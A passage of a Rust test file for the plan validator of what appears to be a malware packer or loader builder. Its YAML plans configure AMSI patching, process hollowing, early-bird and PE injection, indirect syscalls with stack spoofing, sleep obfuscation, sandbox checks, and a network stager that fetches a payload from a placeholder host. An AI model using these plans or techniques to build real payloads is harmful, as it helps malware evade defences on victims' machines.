use super::*;

fn parse(yaml: &str) -> Plan {
    serde_yml::from_str(yaml).expect("valid YAML")
}

/// A minimal valid plan, with optional extra `build` / `output` blocks.
fn plan_yaml(build_extra: &str, out_extra: &str, runtime: &str) -> String {
    format!(
            "schema: 6\nname: t\nbuild:\n  crypto: {{ algo: xchacha20poly1305, key: random }}\n  payloads:\n    p: {{ source: ./p.exe, format: pe }}\n{build_extra}  output:\n    path: ./dist/o.exe\n    arch: x64\n    strip: true\n    trim_paths: all\n{out_extra}runtime:\n{runtime}"
        )
}

/// A minimal valid plan with the given runtime body and one payload.
fn with_runtime(runtime: &str) -> String {
    plan_yaml("", "", runtime)
}

fn with_stub(stub: &str) -> String {
    plan_yaml(
        &format!("  stub:\n{stub}\n"),
        "",
        "  - technique: reflective_loading\n",
    )
}

fn with_sign(sign: &str) -> String {
    plan_yaml(
        "",
        &format!("    sign:\n{sign}\n"),
        "  - technique: reflective_loading\n",
    )
}

#[test]
fn accepts_a_minimal_plan() {
    let plan = parse(&with_runtime("  - technique: reflective_loading\n"));
    validate(&plan).expect("valid");
}

#[test]
fn rejects_an_empty_name() {
    let yaml = with_runtime("  - technique: reflective_loading\n").replace("name: t", "name: ' '");
    assert!(validate(&parse(&yaml)).is_err());
}

#[test]
fn rejects_an_empty_output_path() {
    let yaml = with_runtime("  - technique: reflective_loading\n").replace("./dist/o.exe", "''");
    assert!(validate(&parse(&yaml)).is_err());
}

#[test]
fn accepts_a_plan_without_an_output_path() {
    // Without `path` the build delivers into its bundle's `dist/`, so an
    // omitted value is not an error (only an empty one is).
    let yaml =
        with_runtime("  - technique: reflective_loading\n").replace("    path: ./dist/o.exe\n", "");
    let plan = parse(&yaml);
    assert_eq!(plan.build.output.path, None);
    validate(&plan).expect("valid");
}

#[test]
fn accepts_two_execution_techniques_as_separate_steps() {
    // In the flat model two execution techniques are separate steps with
    // their own payloads, so they do not conflict.
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n    b: { source: ./b.exe, format: pe }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n  - technique: process_hollowing\n    params: { payload: b, target: \"C:\\\\x.exe\" }\n",
        );
    validate(&plan).expect("valid");
}

#[test]
fn accepts_a_preparation_then_an_execution() {
    let plan = parse(&with_runtime(
        "  - technique: patch_amsi\n  - technique: reflective_loading\n",
    ));
    validate(&plan).expect("valid");
}

#[test]
fn accepts_several_execution_steps() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n    b: { source: ./b.exe, format: pe }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n  - technique: sleep\n    params: { ms: 5 }\n  - technique: process_hollowing\n    params: { payload: b, target: \"C:\\\\x.exe\" }\n",
        );
    validate(&plan).expect("valid");
}

/// A plan whose runtime stages the payload `p` with the given stager params
/// and then runs it reflectively.
fn with_stager(params: &str) -> String {
    with_runtime(&format!(
            "  - technique: network_stager\n    params: {params}\n  - technique: reflective_loading\n    params: {{ payload: p }}\n"
        ))
}

#[test]
fn accepts_a_winhttp_stager_with_an_https_url() {
    let plan = parse(&with_stager(
        "{ payload: p, url: \"https://example.invalid/a.bin\", downloader: winhttp }",
    ));
    validate(&plan).expect("valid");
}

#[test]
fn accepts_a_stager_with_an_ftp_url() {
    let plan = parse(&with_stager(
        "{ payload: p, url: \"ftp://example.invalid/a.bin\" }",
    ));
    validate(&plan).expect("valid");
}

#[test]
fn rejects_explicit_winhttp_with_a_non_http_scheme() {
    let plan = parse(&with_stager(
        "{ payload: p, url: \"ftp://example.invalid/a.bin\", downloader: winhttp }",
    ));
    let err = validate(&plan).expect_err("winhttp needs http(s)");
    assert!(err.to_string().contains("winhttp"), "unclear: {err}");
}

#[test]
fn rejects_an_in_process_url_that_cannot_be_parsed() {
    let plan = parse(&with_stager(
        "{ payload: p, url: \"https://\", downloader: winhttp }",
    ));
    let err = validate(&plan).expect_err("no host");
    assert!(err.to_string().contains("host"), "unclear: {err}");
}

#[test]
fn rejects_a_terminal_step_before_the_last_one() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n    b: { source: ./b.exe, format: pe }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: b }\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
    let err = validate(&plan).expect_err("terminal not last");
    assert!(
        err.to_string().contains("terminal") || err.to_string().contains("later"),
        "unclear: {err}"
    );
}

#[test]
fn accepts_a_terminal_step_at_the_end() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n    b: { source: ./b.exe, format: pe }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n  - technique: reflective_loading\n    params: { payload: b }\n",
        );
    validate(&plan).expect("valid");
}

/// `patch_exit` intercepts the payload's `ExitProcess`, so a reflective PE step
/// returns control and may precede another step.
#[test]
fn accepts_a_reflective_pe_step_before_another_with_patch_exit() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.exe, format: pe }\n    b: { source: ./b.bin, format: shellcode }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a, patch_exit: true }\n  - technique: reflective_loading\n    params: { payload: b }\n",
        );
    validate(&plan).expect("patch_exit makes the step return control");
}

/// Raw shellcode has no import table, so `patch_exit` cannot do anything for it
/// and is rejected instead of silently ignored.
#[test]
fn rejects_patch_exit_with_a_shellcode_payload() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a, patch_exit: true }\n",
        );
    let err = validate(&plan).expect_err("shellcode has no IAT");
    assert!(err.to_string().contains("patch_exit"), "unclear: {err}");
    assert!(err.to_string().contains("shellcode"), "unclear: {err}");
}

#[test]
fn rejects_shellcode_with_process_hollowing() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: process_hollowing\n    params: { payload: a, target: \"C:\\\\x.exe\" }\n",
        );
    let err = validate(&plan).expect_err("shellcode hollowing");
    assert!(
        err.to_string().contains("process_hollowing"),
        "unclear: {err}"
    );
}

#[test]
fn rejects_a_dll_with_process_hollowing() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.dll, format: dll }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: process_hollowing\n    params: { payload: a, target: \"C:\\\\x.exe\" }\n",
        );
    assert!(validate(&plan).is_err());
}

/// The three in-process runners execute raw code, so they take shellcode.
#[test]
fn accepts_shellcode_with_the_in_process_runners() {
    for technique in ["execution_callbacks", "module_stomping", "fibers"] {
        let plan = parse(&format!(
                "schema: 6\nname: t\nbuild:\n  crypto: {{ algo: xchacha20poly1305, key: random }}\n  payloads:\n    a: {{ source: ./a.bin, format: shellcode }}\n  output: {{ path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }}\nruntime:\n  - technique: {technique}\n    params: {{ payload: a }}\n"
            ));
        validate(&plan).unwrap_or_else(|e| panic!("{technique}: {e}"));
    }
}

#[test]
fn rejects_a_pe_payload_with_the_in_process_runners() {
    for technique in ["execution_callbacks", "module_stomping", "fibers"] {
        let plan = parse(&format!(
                "schema: 6\nname: t\nbuild:\n  crypto: {{ algo: xchacha20poly1305, key: random }}\n  payloads:\n    a: {{ source: ./a.exe, format: pe }}\n  output: {{ path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }}\nruntime:\n  - technique: {technique}\n    params: {{ payload: a }}\n"
            ));
        let err = validate(&plan).expect_err("a PE needs an image mapper");
        assert!(err.to_string().contains(technique), "unclear: {err}");
    }
}

#[test]
fn rejects_a_shellcode_payload_with_pe_injection() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: pe_injection\n    params: { payload: a, target: \"C:\\\\x.exe\" }\n",
        );
    let err = validate(&plan).expect_err("shellcode has no image to map");
    assert!(err.to_string().contains("pe_injection"), "unclear: {err}");
}

#[test]
fn accepts_a_pe_payload_with_pe_injection() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.exe, format: pe }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: pe_injection\n    params: { payload: a, target: \"C:\\\\x.exe\" }\n",
        );
    validate(&plan).expect("pe_injection maps a PE image");
}

#[test]
fn accepts_shellcode_with_early_bird() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: early_bird\n    params: { payload: a, target: \"C:\\\\x.exe\" }\n",
        );
    validate(&plan).expect("early_bird runs shellcode");
}

#[test]
fn rejects_a_pe_payload_with_early_bird() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.exe, format: pe }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: early_bird\n    params: { payload: a, target: \"C:\\\\x.exe\" }\n",
        );
    let err = validate(&plan).expect_err("early_bird queues raw code");
    assert!(err.to_string().contains("early_bird"), "unclear: {err}");
}

/// The architecture check covers every technique that spawns its own target.
#[test]
fn rejects_an_early_bird_target_of_the_wrong_architecture() {
    let target = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("tests")
        .join("fixtures")
        .join("minimal_x86.exe");
    if !target.is_file() {
        return;
    }
    let plan = parse(&format!(
            "schema: 6\nname: t\nbuild:\n  crypto: {{ algo: xchacha20poly1305, key: random }}\n  payloads:\n    a: {{ source: ./a.bin, format: shellcode }}\n  output: {{ path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }}\nruntime:\n  - technique: early_bird\n    params: {{ payload: a, target: '{}' }}\n",
            target.display()
        ));
    let err = validate(&plan).expect_err("wrong-arch target");
    assert!(err.to_string().contains("early_bird"), "unclear: {err}");
    assert!(err.to_string().contains("architecture"), "unclear: {err}");
}

#[test]
fn rejects_a_dll_payload_with_fibers() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.dll, format: dll }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: fibers\n    params: { payload: a }\n",
        );
    let err = validate(&plan).expect_err("a DLL needs an image mapper");
    assert!(err.to_string().contains("fibers"), "unclear: {err}");
}

#[test]
fn accepts_a_dll_with_an_export() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.dll, format: dll, export: Run }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
    validate(&plan).expect("valid");
}

#[test]
fn rejects_an_export_without_the_dll_format() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.exe, format: pe, export: Run }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
    let err = validate(&plan).expect_err("export on pe");
    assert!(err.to_string().contains("export"), "unclear: {err}");
}

#[test]
fn rejects_an_empty_dll_export() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.dll, format: dll, export: ' ' }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
    assert!(validate(&plan).is_err());
}

#[test]
fn rejects_a_dotnet_payload_without_the_hosting_technique() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.exe, format: dotnet }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
    let err = validate(&plan).expect_err("dotnet without hosting");
    assert!(err.to_string().contains("dotnet_hosting"), "unclear: {err}");
}

#[test]
fn rejects_dotnet_hosting_without_a_dotnet_payload() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.exe, format: pe }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: dotnet_hosting\n    params: { payload: a }\n",
        );
    assert!(validate(&plan).is_err());
}

#[test]
fn accepts_a_valid_payload_sha256() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.exe, format: pe, sha256: \"0000000000000000000000000000000000000000000000000000000000000000\" }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
    validate(&plan).expect("valid");
}

#[test]
fn rejects_a_malformed_payload_sha256() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.exe, format: pe, sha256: \"deadbeef\" }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
    assert!(validate(&plan).is_err());
}

// --- capabilities / arch ---

#[test]
fn rejects_a_technique_without_an_x86_fragment() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n  output: { path: ./dist/o.exe, arch: x86, strip: true, trim_paths: all }\nruntime:\n  - technique: sleep_obfuscation\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
    let err = validate(&plan).expect_err("x64-only technique on x86");
    assert!(
        err.to_string().contains("sleep_obfuscation"),
        "unclear: {err}"
    );
}

#[test]
fn accepts_the_x86_capable_techniques_on_x86() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n  output: { path: ./dist/o.exe, arch: x86, strip: true, trim_paths: all }\nruntime:\n  - technique: patch_amsi\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
    validate(&plan).expect("valid");
}

#[test]
fn rejects_indirect_syscalls_on_x86() {
    let yaml = plan_yaml(
        "  stub:\n    syscalls: { mode: indirect }\n",
        "",
        "  - technique: reflective_loading\n",
    )
    .replace("arch: x64", "arch: x86");
    let plan = parse(&yaml);
    let err = validate(&plan).expect_err("indirect on x86");
    assert!(err.to_string().contains("x64-only"), "unclear: {err}");
}

// --- stub / syscalls / api_resolution ---

#[test]
fn accepts_a_stub_with_only_syscalls() {
    let plan = parse(&with_stub("    syscalls: { mode: none }"));
    validate(&plan).expect("valid");
}

#[test]
fn accepts_an_empty_stub_block() {
    let plan = parse(&with_stub("    {}"));
    validate(&plan).expect("valid");
}

#[test]
fn rejects_unknown_syscalls_mode() {
    let plan = parse(&with_stub("    syscalls: { mode: teleport }"));
    assert!(validate(&plan).is_err());
}

#[test]
fn stack_spoofing_is_a_syscalls_feature_not_a_step() {
    let plan = parse(&with_stub(
        "    syscalls:\n      mode: indirect\n      stack_spoofing:\n        decoy_bytes: 4096\n",
    ));
    validate(&plan).expect("the block is valid with indirect syscalls");
}

#[test]
fn stack_spoofing_is_x64_only() {
    let yaml = with_stub("    syscalls:\n      mode: indirect\n      stack_spoofing: {}\n")
        .replace("arch: x64", "arch: x86");
    let err = validate(&parse(&yaml)).expect_err("x86 stack spoofing");
    assert!(err.to_string().contains("x86_64-only"), "unclear: {err}");
}

#[test]
fn stack_spoofing_is_not_a_runtime_step() {
    let yaml = with_runtime("  - technique: stack_spoofing\n  - technique: reflective_loading\n");
    let err = serde_yml::from_str::<Plan>(&yaml).expect_err("the old step must not parse");
    assert!(err.to_string().contains("stack_spoofing"), "unclear: {err}");
}

#[test]
fn proxy_requires_indirect_syscalls() {
    let plan = parse(&with_stub(
            "    syscalls: { mode: none }\n    api_resolution: { mode: proxy, apis: [\"ntdll!NtReadVirtualMemory\"] }",
        ));
    let err = validate(&plan).expect_err("proxy without indirect");
    assert!(err.to_string().contains("indirect"), "unclear: {err}");
}

#[test]
fn proxy_rejects_a_shellcode_payload() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.bin, format: shellcode }\n  stub:\n    syscalls: { mode: indirect }\n    api_resolution: { mode: proxy, apis: [\"ntdll!NtReadVirtualMemory\"] }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
    let err = validate(&plan).expect_err("proxy with shellcode");
    assert!(err.to_string().contains("import table"), "unclear: {err}");
}

#[test]
fn proxy_rejects_process_hollowing() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.exe, format: pe }\n  stub:\n    syscalls: { mode: indirect }\n    api_resolution: { mode: proxy, apis: [\"ntdll!NtReadVirtualMemory\"] }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: process_hollowing\n    params: { payload: a, target: \"C:\\\\x.exe\" }\n",
        );
    let err = validate(&plan).expect_err("proxy with hollowing");
    assert!(
        err.to_string().contains("process_hollowing"),
        "unclear: {err}"
    );
}

#[test]
fn proxy_rejects_pe_injection() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.exe, format: pe }\n  stub:\n    syscalls: { mode: indirect }\n    api_resolution: { mode: proxy, apis: [\"ntdll!NtReadVirtualMemory\"] }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: pe_injection\n    params: { payload: a, target: \"C:\\\\x.exe\" }\n",
        );
    let err = validate(&plan).expect_err("proxy with pe_injection");
    assert!(err.to_string().contains("pe_injection"), "unclear: {err}");
}

#[test]
fn proxy_rejects_a_second_payload_load() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.dll, format: dll, export: Run }\n    b: { source: ./b.dll, format: dll, export: Run }\n  stub:\n    syscalls: { mode: indirect }\n    api_resolution: { mode: proxy, apis: [\"ntdll!NtReadVirtualMemory\"] }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n  - technique: reflective_loading\n    params: { payload: b }\n",
        );
    let err = validate(&plan).expect_err("proxy with two loads");
    assert!(err.to_string().contains("proxy"), "unclear: {err}");
}

#[test]
fn accepts_the_sleep_hook_with_reflective_loading() {
    let plan = parse(&with_stub(
            "    syscalls: { mode: indirect }\n    api_resolution:\n      mode: proxy\n      hooks:\n        sleep:\n          assume_single_threaded: true\n",
        ));
    validate(&plan).expect("the hook is valid with reflective_loading");
}

#[test]
fn sleep_hook_rejects_a_non_reflective_execution() {
    // `process_ghosting` accepts a PE payload and is not covered by the
    // hollowing/injection rejection, so this reaches the hook's own check.
    let plan = parse(&plan_yaml(
            "  stub:\n    syscalls: { mode: indirect }\n    api_resolution:\n      mode: proxy\n      hooks:\n        sleep:\n          assume_single_threaded: true\n",
            "",
            "  - technique: process_ghosting\n",
        ));
    let err = validate(&plan).expect_err("the hook needs the region registry");
    assert!(
        err.to_string().contains("reflective_loading"),
        "unclear: {err}"
    );
}

// --- sign ---

#[test]
fn accepts_the_signing_modes() {
    for sign in [
        "      mode: none",
        "      mode: lab",
        "      mode: lab\n      subject: CN=lab",
    ] {
        validate(&parse(&with_sign(sign))).expect("valid signing");
    }
}

#[test]
fn rejects_an_unknown_signing_mode() {
    assert!(validate(&parse(&with_sign("      mode: wizardry"))).is_err());
}

#[test]
fn store_signing_needs_a_subject_or_thumbprint() {
    assert!(validate(&parse(&with_sign("      mode: store"))).is_err());
}

#[test]
fn file_signing_needs_a_path() {
    assert!(validate(&parse(&with_sign("      mode: file"))).is_err());
}

#[test]
fn rejects_a_non_http_timestamp_url() {
    let yaml = with_sign("      mode: lab\n      timestamp_url: ftp://ts");
    assert!(validate(&parse(&yaml)).is_err());
}

// --- hollowing target arch ---

#[test]
fn rejects_a_hollowing_target_of_the_wrong_architecture() {
    // The packer runs on x64 in CI; a 32-bit target on an x64 stub is wrong.
    let target = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("tests")
        .join("fixtures")
        .join("minimal_x86.exe");
    if !target.is_file() {
        return;
    }
    let plan = parse(&format!(
            "schema: 6\nname: t\nbuild:\n  crypto: {{ algo: xchacha20poly1305, key: random }}\n  payloads:\n    a: {{ source: ./a.exe, format: pe }}\n  output: {{ path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }}\nruntime:\n  - technique: process_hollowing\n    params: {{ payload: a, target: '{}' }}\n",
            target.display()
        ));
    let err = validate(&plan).expect_err("wrong-arch target");
    assert!(err.to_string().contains("architecture"), "unclear: {err}");
}

#[test]
fn wow64_resolve_maps_the_redirected_directories() {
    assert_eq!(
        wow64_resolve(r"C:\Windows\System32\svchost.exe", Arch::X86),
        Some(std::path::PathBuf::from(r"C:\Windows\SysWOW64\svchost.exe"))
    );
    assert_eq!(wow64_resolve("relative.exe", Arch::X64), None);
    assert_eq!(wow64_resolve("$arg.0$", Arch::X64), None);
}

// --- sleep obfuscation ---

#[test]
fn accepts_sleep_obfuscation_defaults() {
    let plan = parse(&with_runtime(
        "  - technique: sleep_obfuscation\n  - technique: reflective_loading\n",
    ));
    validate(&plan).expect("valid");
}

#[test]
fn rejects_unimplemented_variants() {
    let plan = parse(&with_runtime(
            "  - technique: sleep_obfuscation\n    params: { variant: foliage, sleep_ms: 100 }\n  - technique: reflective_loading\n",
        ));
    let err = validate(&plan).expect_err("foliage not implemented");
    assert!(err.to_string().contains("foliage"), "unclear: {err}");
}

#[test]
fn rejects_oversized_sleep() {
    let plan = parse(&with_runtime(
            "  - technique: sleep_obfuscation\n    params: { sleep_ms: 5000000000 }\n  - technique: reflective_loading\n",
        ));
    assert!(validate(&plan).is_err());
}

// --- bouncer advisories ---

/// The `unimplemented` state must surface as a build warning.
///
/// The registry owns which techniques carry it, so the test follows the
/// registry instead of naming one: when the state is used, the advisory has
/// to fire; when nothing is marked, there is nothing to warn about.
#[test]
fn advises_on_an_unimplemented_technique() {
    let marked: Vec<&str> = crate::techniques::all()
        .iter()
        .filter(|def| def.stability == Stability::Unimplemented)
        .map(|def| def.name)
        .collect();

    for name in marked {
        let plan = parse(&with_runtime(&format!("  - technique: {name}\n")));
        let warnings = advisories(&plan);
        assert!(
            warnings
                .iter()
                .any(|w| w.contains(name) && w.contains("unimplemented")),
            "{name}: expected an 'unimplemented' advisory, got {warnings:?}"
        );
    }
}

#[test]
fn advises_on_a_noop_bouncer() {
    let plan = parse(&with_runtime(
        "  - technique: bouncer\n  - technique: reflective_loading\n",
    ));
    let warnings = advisories(&plan);
    assert!(
        warnings.iter().any(|w| w.contains("no-op")),
        "expected a no-op advisory: {warnings:?}"
    );
}

#[test]
fn no_advisory_when_bouncer_declares_a_check() {
    let plan = parse(&with_runtime(
            "  - technique: bouncer\n    params: { require: [{ ram_mb: 512 }] }\n  - technique: reflective_loading\n",
        ));
    let warnings = advisories(&plan);
    assert!(
        !warnings.iter().any(|w| w.contains("no-op")),
        "unexpected advisory: {warnings:?}"
    );
}

#[test]
fn advises_on_an_unknown_lolbin() {
    let plan = parse(&with_runtime(
        "  - technique: living_off_the_land\n    params: { binary: my_implant.exe }\n",
    ));
    let warnings = advisories(&plan);
    assert!(
        warnings.iter().any(|w| w.contains("living-off-the-land")),
        "expected a LOLBin advisory: {warnings:?}"
    );
}

#[test]
fn no_lolbin_advisory_for_a_known_binary() {
    let plan = parse(&with_runtime(
        "  - technique: living_off_the_land\n    params: { binary: certutil.exe }\n",
    ));
    let warnings = advisories(&plan);
    assert!(
        !warnings.iter().any(|w| w.contains("living-off-the-land")),
        "unexpected advisory: {warnings:?}"
    );
}

#[test]
fn advices_on_a_debug_build() {
    let plan = parse(&with_stub("    debug: true"));
    let warnings = advisories(&plan);
    assert!(
        warnings.iter().any(|w| w.contains("debug")),
        "expected a debug advisory: {warnings:?}"
    );
}

// --- host-loaded DLL output (`build.output.kind: dll`) --------------------

/// A `kind: dll` plan; `output_extra` is inserted right after `path`/`kind`.
fn with_dll(output_extra: &str, runtime: &str) -> String {
    format!(
            "schema: 6\nname: t\nbuild:\n  crypto: {{ algo: xchacha20poly1305, key: random }}\n  payloads:\n    p: {{ source: ./p.exe, format: pe }}\n  output:\n    path: ./dist/o.dll\n    kind: dll\n{output_extra}runtime:\n{runtime}"
        )
}

fn dll_runtime() -> &'static str {
    "  - technique: reflective_loading\n"
}

/// A `kind: shellcode` plan; `output_extra` is inserted after `path`/`kind`.
fn with_shellcode(output_extra: &str, runtime: &str) -> String {
    format!(
            "schema: 6\nname: t\nbuild:\n  crypto: {{ algo: xchacha20poly1305, key: random }}\n  payloads:\n    p: {{ source: ./p.exe, format: pe }}\n  output:\n    path: ./dist/o.bin\n    kind: shellcode\n{output_extra}runtime:\n{runtime}"
        )
}

#[test]
fn accepts_a_shellcode_with_a_plain_export() {
    let plan = parse(&with_shellcode("    entry: export:Run\n", dll_runtime()));
    validate(&plan).expect("valid");
}

#[test]
fn rejects_signing_for_shellcode() {
    let plan = parse(&with_shellcode("    sign: { mode: lab }\n", dll_runtime()));
    let err = validate(&plan).expect_err("shellcode is not a PE");
    assert!(err.to_string().contains("sign"), "unclear: {err}");
}

#[test]
fn rejects_the_jni_entry_for_shellcode() {
    let plan = parse(&with_shellcode("    entry: jni_on_load\n", dll_runtime()));
    let err = validate(&plan).expect_err("no plain export to call");
    assert!(err.to_string().contains("jni_on_load"), "unclear: {err}");
}

#[test]
fn rejects_resources_for_shellcode() {
    let plan = parse(&with_shellcode(
        "    resources: { icon: random }\n",
        dll_runtime(),
    ));
    let err = validate(&plan).expect_err("resources are PE-only");
    assert!(err.to_string().contains("resources"), "unclear: {err}");
}

#[test]
fn rejects_x86_shellcode() {
    let plan = parse(&with_shellcode(
        "    entry: export:Run\n    arch: x86\n",
        dll_runtime(),
    ));
    let err = validate(&plan).expect_err("the export shape unbalances on x86");
    assert!(err.to_string().contains("x86"), "unclear: {err}");
}

#[test]
fn accepts_a_dll_with_a_plain_export() {
    let plan = parse(&with_dll("    entry: export:Run\n", dll_runtime()));
    validate(&plan).expect("valid");
}

#[test]
fn accepts_the_default_dll_entry() {
    let plan = parse(&with_dll("", dll_runtime()));
    assert_eq!(plan.build.output.entry, DllEntry::Auto);
    assert_eq!(plan.build.output.kind, OutputKind::Dll);
    validate(&plan).expect("valid");
}

#[test]
fn rejects_an_export_name_that_is_not_an_identifier() {
    let plan = parse(&with_dll("    entry: export:my-run\n", dll_runtime()));
    let err = validate(&plan).expect_err("expected a validation error");
    assert!(
        err.to_string().contains("not a valid function name"),
        "unclear error: {err}"
    );
}

#[test]
fn rejects_an_empty_export_name() {
    let plan = parse(&with_dll("    entry: \"export:\"\n", dll_runtime()));
    let err = validate(&plan).expect_err("expected a validation error");
    assert!(
        err.to_string().contains("empty export name"),
        "unclear error: {err}"
    );
}

#[test]
fn rejects_an_export_name_that_collides_with_a_builtin_entry() {
    let plan = parse(&with_dll("    entry: export:DllMain\n", dll_runtime()));
    let err = validate(&plan).expect_err("expected a validation error");
    assert!(err.to_string().contains("collides"), "unclear error: {err}");
}

#[test]
fn rejects_a_windows_subsystem_with_a_dll() {
    let plan = parse(&with_dll("    subsystem: windows\n", dll_runtime()));
    let err = validate(&plan).expect_err("expected a validation error");
    assert!(
        err.to_string().contains("subsystem"),
        "unclear error: {err}"
    );
}

#[test]
fn rejects_the_application_manifest_with_a_dll() {
    let plan = parse(&with_dll(
